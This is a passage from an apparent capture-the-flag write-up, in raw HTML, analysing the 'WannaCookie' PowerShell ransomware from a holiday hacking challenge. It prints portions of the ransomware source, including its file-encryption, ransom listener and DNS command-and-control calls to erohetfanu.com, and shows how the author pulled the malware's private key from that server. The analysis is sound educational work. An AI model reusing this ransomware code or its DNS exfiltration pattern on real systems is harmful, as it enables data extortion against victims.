                            <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span>
                            <span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span>
                            <span class="p">});</span>
                    <span class="n">e_n_d</span> <span class="nv">$akey</span> <span class="nv">$f_c</span> <span class="nv">$false</span><span class="p">;</span>
                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Files have been decrypted!&quot;</span><span class="p">;</span>
                    <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Invalid Key!&quot;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /close&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">;</span>
                <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$html_c</span><span class="p">[</span><span class="nv">$recvd</span><span class="p">]</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /cookie_is_paid&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$c_n_k</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="p">(</span><span class="s2">&quot;$c_id.72616e736f6d697370616964.erohetfanu.com&quot;</span><span class="p">.</span><span class="n">trim</span><span class="p">())</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span> <span class="nv">$c_n_k</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">32</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$c_n_k</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;UNPAID|$c_id|$d_t&quot;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$Resp</span><span class="p">.</span><span class="n">statuscode</span> <span class="p">=</span> <span class="n">404</span><span class="p">;</span>
                <span class="nv">$html</span> <span class="p">=</span> <span class="s1">&#39;&lt;h1&gt;404 Not Found&lt;/h1&gt;&#39;</span>
            <span class="p">};</span>
            <span class="nv">$buffer</span> <span class="p">=</span> <span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$html</span><span class="p">);</span>
            <span class="nv">$Resp</span><span class="p">.</span><span class="n">ContentLength64</span> <span class="p">=</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
            <span class="nv">$Resp</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
            <span class="nv">$Resp</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$close</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$list</span><span class="p">.</span><span class="n">Stop</span><span class="p">();</span>
                <span class="k">return</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
        <span class="nv">$list</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="n">wanc</span><span class="p">;</span>
</pre></div>
<p>Whew, that's a lot of script. We'll analyze it more deeply in the next
question. The script defines many functions. The main one seems to be
<code>wanc</code>, since it's called at the end of the script. Let's take a look at
the beginning of this function:</p>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">wanc</span> <span class="p">{</span>
    <span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span><span class="p">;</span>
<span class="hll">    <span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span>
</span>        <span class="k">return</span>
    <span class="p">};</span>
    <span class="k">if</span> <span class="p">($(</span><span class="n">netstat</span> <span class="n">-ano</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;127.0.0.1:8080&quot;</span><span class="p">).</span><span class="n">length</span> <span class="o">-ne</span> <span class="n">0</span> <span class="o">-or</span> <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">Domain</span> <span class="o">-ne</span> <span class="s2">&quot;KRINGLECASTLE&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span>
    <span class="p">};</span>
<span class="no">[snip]</span>
</pre></div>
<p>The function begins by making some kind of DNS request. If it resolves, then
it immediatly returns. It also checks if something is listening on
<code>127.0.0.1:8080</code> (<em>i.e.</em> if the ransomware is already running), and if
the Active Directory domain of the infected machine is <code>KRINGLECASTLE</code>:</p>
<ul class="simple">
<li>The first check (the DNS check) is used to make sure that the ransomware is
not being ran in a virtual machine. This check is similar to what
<a class="reference external" href="https://twitter.com/MalwareTechBlog">&#64;MalwareTechBlog</a> found in the
WannaCry ransomware.</li>
<li>The second check (the network check and the Active Directory check) is to
make sure that the ransomware is running on the intended target, and is not
being ran more than once.</li>
</ul>
<p>Similarly to WannaCry, if we register the killswitch domain, then it will
always resolved and the ransomware will stop working. To find the kill switch
domain, let's just execute the PowerShell code used to generate it. To run
this command, the variable <code>S1</code> and the functions <code>H2A</code>,
<code>B2H</code>, <code>H2B</code>, <code>G2B</code>, and <code>ti_rox</code> must be defined:</p>
<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">)))</span>
<span class="go">yippeekiyaa.aaay</span>
</pre></div>
<p>The killswitch domain seems to be <code>yippeekiyaa.aaay</code>. Let's register it
on <a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>:</p>
<img alt="hohoho_daddy_success.png" class="align-center" src="/images/sans-christmas-challenge-2018/hohoho_daddy_success.png" />
<p>Alright! We stopped the malware. We can now feel like &#64;MalwareTechBlog. You
know, without the federal investigation and stuff... Anyway! The sentence is
<code>Successfully registered yippeekiyaa.aaay!</code>.</p>
</div>
<div class="section" id="memory-dump-analysis">
<h3><a class="toc-backref" href="#id43">Memory Dump Analysis</a></h3>
<p>Alabaster needs us to decrypt his password database, that was encrypted by the
WannaCookie ransomware.</p>
<img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" />
<p><em>Alabaster says</em></p>
<blockquote>
<p>Yippee-Ki-Yay! Now, I have a ma... kill-switch!</p>
<p>Now that we don't have to worry about new infections, I could sure use your
L337 security skills for one last thing.</p>
<p>As I mentioned, I made the mistake of analyzing the malware on my host
computer and the ransomware encrypted my password database.</p>
<p>Take this <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip</a>
with a memory dump and my encrypted password database, and see if you can
recover my passwords.</p>
<p>One of the passwords will unlock our access to the vault so we can get in
before the hackers.</p>
</blockquote>
<p>Alright, a lot is happening. Here's what we can see from the source code:</p>
<ul class="simple">
<li>The function <code>e_d_file</code> takes a key, a file, and a boolean. If the
boolean is true, the file is encrypted using AES in CBC mode. If the boolean
is false, the file is decrypted using the same algorithm.</li>
<li><dl class="first docutils">
<dt>Some helper functions are defined:</dt>
<dd><ul class="first last">
<li><code>H2B</code>, <code>B2H</code>: convert data from/to hexadecimal strings
to/from binary objects.</li>
<li><code>H2A</code>, <code>A2H</code>: convert data from/to hexadecimal strings
to/from byte arrays.</li>
<li><code>G2B</code>, <code>B2G</code>: convert data from/to compressed data to/from
binary objects.</li>
</ul>
</dd>
</dl>
</li>
<li>The function <code>ti_rox</code> seems to XOR two variables.</li>
<li>The function <code>sh1</code> is just a wrapper to the SHA1 hashing function.</li>
<li>The function <code>p_k_e</code> encrypts a variable using a public key.</li>
<li>The function <code>e_n_d</code> encrypts/decrypts a list of files using an AES
key (by calling the <code>e_d_file</code> function).</li>
<li>The function <code>g_o_dns</code> seems to recover some data from the
<code>erohetfanu.com</code> DNS server.</li>
<li>The function <code>s_2_c</code> splits a string into chunks.</li>
<li>The function <code>snd_k</code> sends, chunk by chunk, a string to the
<code>erohetfanu.com</code> DNS server.</li>
<li>Finally, the function <code>wanc</code> is the main function.</li>
</ul>
<p>Let's analyze how the malware works, so that we can find a way to decrypt
Alabaster's passwords. Here's what <code>wanc</code> does:</p>
<ul class="simple">
<li>It first checks the killswitch domain, whether the malware is already
running, and if it's running on the intended target.</li>
<li>It then recovers what seems to be a public key, <code>$p_k</code>, from the DNS
server, with the following command: <code>g_o_dns(&quot;7365727665722E637274&quot;)</code>.</li>
<li>It then generates an AES key, <code>$b_k</code>, using two arrays of bytes from
1 to 255 (no zero), and the function <code>Get-Random</code>.</li>
<li>The key is hex-encoded in <code>$h_k</code>, which is then hashed using SHA1 and
stored in <code>$k_h</code>.</li>
<li>The AES key <code>$b_k</code> is encrypted using the public key <code>$p_k</code>. The
result is stored in <code>$p_k_e_k</code>.</li>
<li>The encrypted key, <code>$p_k_e_k</code> is sent to the DNS server, which gives
a victim id, <code>$c_id</code>.</li>
<li>The current date in UTC is stored in <code>$d_t</code>.</li>
<li>A list of all <code>*.elfdb</code> files is generated, and then encrypted using
<code>$b_k</code>.</li>
<li>The variables <code>$b_k</code> and <code>$h_k</code> are cleared using
<code>Clear-Variable</code>. (The variable <code>$key</code>, which holds the value of
<code>$b_k</code> in <code>e_d_file</code> is also cleared).</li>
<li>The malware sets up an HTTP listener on <code>127.0.0.1:8080</code>, which
displays an HTML ransom message, downloaded from the DNS server, using the
code <code>g_o_dns (A2H &quot;source.min.html&quot;)</code>. The HTTP listener handles
decryption requests: when the victim pays the ransom, the decryption key is
given to them. They can then enter them in the HTTP listener, which will
compare this key's SHA1 sum to the one it has in memory in the variable
<code>$k_h</code>. If they match, the files are decrypted.</li>
</ul>
<div class="section" id="id3">
<h4><a class="toc-backref" href="#id44">All the dead ends, yay!</a></h4>
<p>Alright, knowing this, how can we try and recover Alabaster's passwords? Here's
a list of the things that I tried and that <strong>don't work</strong>, but still took a
whole lot of time to test (and then had the audacity of <strong>not being the right
solutions, damn them!</strong>). Again, if you just directly want the right solution,
you can <a class="reference external" href="#id4">jump to it</a>.</p>
<p>I first thought that maybe the keys weren't correctly cleared in the memory
dump and that I could recover them, using tools such as <code>aes-finder</code>,
<code>aeskeyfind</code>, <code>findaes</code>, etc. But these tools did not find
anything.</p>
<p>I then thought that maybe the <a class="reference external" href="https://tools.kali.org/forensics/volatility">Volatility framework</a> could help. But it doesn't
support the Mini DuMP format used in the dump. So, another deadend.</p>
<p>I then thought thay maybe the password file or the encryption key could be
found in cleartext using <code>binwalk</code>. But it only returned what I think
were many false-positives, and no password file or encryption key.</p>
<p>On to my next deadend, which stole most of my time. It's common for ransomware
to generate weak encryption keys, because of unproper random initialization.
Here's an <a class="reference external" href="https://blog.malwarebytes.com/threat-analysis/2018/03/encryption-101-how-to-break-encryption/">example</a>.
If you remember, the malware generates the AES key using the PowerShell
function <code>Get-Random</code>, without any seed. I did a little research on this
function, and found some <a class="reference external" href="https://www.reddit.com/r/Iota/comments/6v9mj6/psa_nearly_all_powershell_generated_seeds_are/">resources online</a>
that suggested that maybe the randomness produced by <code>Get-Random</code> was
not cryptographically-secure. I then read <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-random?view=powershell-6">Microsoft's documentation of the
function</a>,
which states (emphasis mine):</p>
<blockquote>
<p><strong>-SetSeed</strong></p>
<p>Specifies a seed value for the random number generator. This seed value is
used for the current command and for all subsequent Get-Random commands in
the current session until you use SetSeed again or close the session. You
cannot reset the seed to its default, clock-based value.</p>
<p>The SetSeed parameter is not required. <strong>By default, Get-Random uses the
system clock to generate a seed value</strong>. Because SetSeed results in
non-random behavior, it is typically used only when trying to reproduce
behavior, such as when debugging or analyzing a script that includes
Get-Random commands.</p>
</blockquote>
<p>I thought I had my ticket with this. I thought that if I found at what time the
ransomware was launched, I could use this time as a seed to regenerate the
encryption key. Luckily, we have several ways to find around which time the
ransomware was launched. First, it's in the metadata of the dump file:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> file powershell.exe_181109_104716.dmp
<span class="go">powershell.exe_181109_104716.dmp: Mini DuMP crash report, 19 streams, Fri Nov  9 15:47:39 2018, 0x61826 type</span>
</pre></div>
<p>Then, if you remember, the current date was stored in a variable <code>$d_t</code>
in the ransomware. This date was displayed in the HTML listener, next to the
payment status:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -a UNPAID powershell.exe_181109_104716.dmp
<span class="go">�B_��RE_��_E_ ����OUNPAID|               4739626449686a334d36|Friday, November 09, 2018 3:25:34 PM</span>
<span class="go">[snip]</span>
</pre></div>
<p>So, the ransomware was launched on Friday, November 09, 2018, around 3:00 PM.
Now that I knew the time of launch, I could try to regenerate the AES key
using <code>Get-Random</code>. Or so I thought... No matther how I initialized the
key, I wasn't able to obtain reproductible results using <code>Get-Random</code>.</p>
<p>I then saw online that maybe <code>Get-Random</code> is not seeded with the system
date, but with the system uptime, using <code>TickCounts</code>. But there again, I
wasn't able to obtain reproductible results. I did some more digging, and
<a class="reference external" href="https://stackoverflow.com/questions/45135091/what-prng-does-get-random-in-powershell-5-1-use">several</a>
StackOverflow <a class="reference external" href="https://stackoverflow.com/questions/34331541/what-is-the-default-seed-for-powershell-get-random-cmdlet">posts</a>
indicated that the seed initialization is trickier that I thought. As suggested
by one of these posts, I took a look at PowerShell's source code on <a class="reference external" href="https://github.com/PowerShell/PowerShell/blob/master/src/Microsoft.PowerShell.Commands.Utility/commands/utility/GetRandomCommand.cs">GitHub</a>.</p>
<p>There, you can see that if you initialize the seed using <code>-SetSeed</code>, you
can see that the random generator used is <code>System.Random</code>. If you don't
initialize the seed, the random generator used is
<code>System.Security.Cryptography.RandomNumberGenerator</code>. However, <a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=netframework-4.7.2">this
function</a>
does not seem to have any weakness in its seed initialization process.</p>
<p>After having wasted three days on this track, I gave up and asked for my
coworkers' help. While most of them were busy and made me understand in
colorful phrasing that they didn't have the time to help me, one of them,
<a class="reference external" href="https://github.com/imaibou">imaibou</a>, had some time to take a look.</p>
<p>He ran a deweaponized version of the ransomware (where the encryption was
commented out) and then produced a dump of the PowerShell process. He then
mentioned to me that he was able to find out his AES key (that he had printed
out) in the memory dump of his process. Ha! I was right from the start: the
key is not properly cleared from the memory. Or so I thought, yet again...
We tried searching for the keys in Alabater's memory dump in every imaginable
format:</p>
<ul class="simple">
<li>In raw hexadecimal (<code>\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX</code>).</li>
<li>In UTF16-LE encoded hexadecimal (<code>\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00</code>).</li>
<li>In printable hex representation (<code>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code>)</li>
<li>In UTF16-LE encoded printable hex representation (<code>XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00</code>)</li>
<li>In oh-so-many other formats...</li>
</ul>
<p>But no luck. Even though we managed to find our key in our home-made memory
dump, we couldn't find the key in Alabaster's dump. Even our boss, Christophe,
took time out of his schedule to lend a hand. but even his security super
powers didn't manage to take us out of this slump.</p>
<p>Out of ideas, ashamed, and tired, we went and looked at the hints for this
question. Here's what we were given:</p>
<blockquote>
<p><code>wannacookie.min.ps1</code>? I wonder if there is a non-minified version?
If so, it may be easier to read and give us more information and maybe
source comments?</p>
<p>Whoa, <a class="reference external" href="http://www.youtube.com/watch?v=wd12XRq2DNk">Chris Davis' talk</a> on
PowerShell malware is crazy pants! You should check it out!</p>
<p>Pulling strings from a memory dump using the linux <code>strings</code> command
requires you specify the <code>-e</code> option with the specific format
required by the OS and processor. Of course, you could also use
<a class="reference external" href="https://github.com/chrisjd20/power_dump">powerdump</a>.</p>
</blockquote>
<p>I didn't understand the reference to <code>wannacookie.min.ps1</code>, since I
hadn't seen this filename anywhere (but more on that later).</p>
<p>I then felt stupid: I had forgotten that KringleCon is initially a security
conference. I then proceeded to watch Chris Davis' talk on PowerShell malware
memory analysis, where he presents his tool <code>power_dump</code>, which can be
used to analyze memory dump of PowerShell processes, and extract variables.</p>
<p>I loaded up <code>power_dump</code>, sighing that I finally will be able to answer
this question. I used the tool to search for 32-byte long hexadecimal
representation:</p>
<div class="highlight"><pre><span></span>================ Filters ================
1| MATCHES  bool(re.search(r&quot;^[0-9a-fA-F]+$&quot;,variable_values))
2| LENGTH  len(variable_values) == 32

[i] 5 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches &quot;[python_regex]&quot;    | match python regex inside quotes
len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print all
<span class="hll">033ecb2bc07a4d43b5ef94ed5a35d280
</span>Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
<span class="hll">cf522b78d86c486691226b40aa69e95c
</span>Variable Values #2 above ^
Type any key to go back and just Enter to Continue...
<span class="hll">9e210fe47d09416682b841769c78b8a3
</span>Variable Values #3 above ^
Type any key to go back and just Enter to Continue...
<span class="hll">4ec4f0187cb04f4cb6973460dfe252df
</span>Variable Values #4 above ^
Type any key to go back and just Enter to Continue...
<span class="hll">27c87ef9bbda4f709f6b4002fa4af63c
</span>Variable Values #5 above ^
Type any key to go back and just Enter to Continue...
</pre></div>
<p>&quot;Huh&quot;, I thought, &quot;these keys look familiar&quot;. That's because I had already
found them in the memory dump using <code>strings</code>! And I know that they're
not the correct keys!</p>
</div>
<div class="section" id="id4">
<h4><a class="toc-backref" href="#id45">The right solution</a></h4>
<p>Despair fell on me again. Now I was freshly out of ideas, again! I then turned
to my last resort: the KringleCon chat. People told me that maybe I shouldn't
try to look directly for the key in memory, but to another form. I also noticed
that people were talking a lot about public/private key encryption.</p>
<p>And then it clicked: I should look for the encrypted key in memory, that is
the value of the <code>$p_k_e_k</code> variable. But even if I find this value, how
will I decrypt it without the private key? My colleague <a class="reference external" href="https://github.com/imaibou">imaibou</a> mentioned that he tried to factor the public
key using <a class="reference external" href="https://eprint.iacr.org/2015/398.pdf">weak factors</a>, but to no
avail. I saw in the KringleCon chat that some people had managed to find the
ransomware's private key.</p>
<p>And then it cliked again! I thought back to the first hint, the one I didn't
understand, talking about <code>wannacookie.min.ps1</code>. Remember the hash we
used for our Snort rule? Its value is
<code>77616E6E61636F6F6B69652E6D696E2E707331</code>. What happens if we decode this
hex value?</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">echo</span> 77616E6E61636F6F6B69652E6D696E2E707331 <span class="p">|</span> xxd -r -p
<span class="go">wannacookie.min.ps1</span>
</pre></div>
<p>We can encode some file names in hexadecimal, and then download them from the
DNS server, using the <code>g_o_dns</code> PowerShell function. For example, let's
try to download an unminified version of the malware. We can kind of guess
that the filename will be <code>wannacookie.ps1</code>. Let's encode this, and
download it with <code>g_o_dns</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">echo</span> -n wannacookie.ps1 <span class="p">|</span> xxd -p
<span class="go">77616e6e61636f6f6b69652e707331</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;77616e6e61636f6f6b69652e707331&quot;</span><span class="p">)</span> <span class="p">&gt;</span> <span class="p">.\</span><span class="n">wannacookie</span><span class="p">.</span><span class="n">ps1</span>
<span class="gp">PS C:\&gt; </span><span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">wannacookie</span><span class="p">.</span><span class="n">ps1</span>
<span class="go">$functions = {</span>
<span class="go">    function Enc_Dec-File($key, $File, $enc_it) {</span>
<span class="go">        [byte[]]$key = $key</span>
<span class="go">        $Suffix = &quot;`.wannacookie&quot;</span>
<span class="go">        [System.Reflection.Assembly]::LoadWithPartialName(&#39;System.Security.Cryptography&#39;)</span>
<span class="go">        [System.Int32]$KeySize = $key.Length*8</span>
<span class="go">        $AESP = New-Object &#39;System.Security.Cryptography.AesManaged&#39;</span>
<span class="go">[...]</span>
<span class="go">function wannacookie {</span>
<span class="go">    $S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span>
<span class="go">    if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}</span>
<span class="go">    if ($(netstat -ano | Select-String &quot;127.0.0.1:8080&quot;).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne &quot;KRINGLECASTLE&quot;) {return}</span>
<span class="go">    $pub_key = [System.Convert]::FromBase64String($(get_over_dns(&quot;7365727665722E637274&quot;) ) )</span>
<span class="go">    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join &#39;&#39;))  | ? {$_ -ne 0x00})</span>
<span class="go">    $Hex_key = $(B2H $Byte_key)</span>
<span class="go">    $Key_Hash = $(Sha1 $Hex_key)</span>
<span class="go">[...]</span>
</pre></div>
<p>Awesome, we can download file from the DNS server. Now, let's go back to the
malware's source code. How did it download the public key?</p>
<div class="highlight"><pre><span></span><span class="nv">$p_k</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
</pre></div>
<p>Let's decode the <code>7365727665722E637274</code> string:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">echo</span> 7365727665722E637274 <span class="p">|</span> xxd -p -r
<span class="go">server.crt</span>
</pre></div>
<p>So, apparently, the public key was in a file called <code>server.crt</code>. What's
the name of the file containing the private key? Let's try something simple,
such as <code>server.key</code>.</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">echo</span> -n server.key <span class="p">|</span> xxd -p
<span class="go">7365727665722e6b6579</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722e6b6579&quot;</span><span class="p">)</span>
<span class="go">-----BEGIN PRIVATE KEY-----</span>
<span class="go">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG</span>
<span class="go">L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui</span>
<span class="go">W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq</span>
<span class="go">jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S</span>
<span class="go">TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3</span>
<span class="go">HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4</span>
<span class="go">tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc</span>
<span class="go">0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW</span>
<span class="go">OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN</span>
<span class="go">6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U</span>
<span class="go">3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm</span>
<span class="go">Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9</span>
<span class="go">uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2</span>
<span class="go">Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG</span>
<span class="go">4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB</span>
<span class="go">0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498</span>
<span class="go">/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q</span>
<span class="go">8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE</span>
<span class="go">KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4</span>
<span class="go">eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v</span>
<span class="go">sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx</span>
<span class="go">moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy</span>
<span class="go">DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4</span>
<span class="go">Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE</span>
<span class="go">JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq</span>
<span class="go">UdrzXvSwyFuuIqBlkHnWSIeC</span>
<span class="go">-----END PRIVATE KEY-----</span>
</pre></div>
<p>Awesome! We now have the ransomware's private key! We can use it to recover our
AES key. But first, we must find our encrypted AES key in our memory dump. To
know what we're looking for, let's encrypt a fake AES key using the
ransomware's source code and public key, to see the result:</p>
<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="nv">$p_k</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)));</span>
